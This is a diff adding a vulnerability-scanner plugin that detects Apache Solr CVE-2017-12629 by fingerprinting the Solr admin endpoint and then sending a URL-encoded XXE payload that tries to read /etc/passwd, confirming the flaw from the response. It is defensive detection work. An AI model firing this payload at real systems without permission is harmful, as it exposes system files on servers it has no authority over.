@@ -1,0 +1,78 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Apache_Solr_CVE_2017_12629"
+  author: "dyeddala"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2017-12629"
+  }
+  severity: CRITICAL
+  title: "Apache Solr < 7.1.0 - Remote Code Execution / XXE"
+  description: "Apache Solr before 7.1.0 with Apache Lucene before 7.1.0 is vulnerable to XML External Entity (XXE) expansion in the XML Query Parser and Remote Code Execution via the Config API (RunExecutableListener)."
+  recommendation: "Upgrade Apache Solr to version 7.1.0 or later. Restrict access to administrative endpoints and disable vulnerable request handlers if updates cannot be applied immediately."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2017-12629"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_solr"
+  http_request: {
+    method: GET
+    uri: "/solr/admin/info/system?wt=json"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "solr-spec-version" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "detect_xxe_xmlparser"
+  http_request: {
+    method: GET
+    uri: "/solr/demo/select?wt=xml&defType=xmlparser&q=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE+test+%5B%3C%21ENTITY+%25+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E+%25xxe%3B%5D%3Cg%3E%3C%2Fg%3E"
+    response: {
+      http_status: 400
+      expect_any: {
+        conditions: [
+          { body: {} contains: "systemId: file:///etc/passwd" },
+          { body: {} contains: "root:x:0:0" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_solr",
+    "detect_xxe_xmlparser"
+  ]
+}
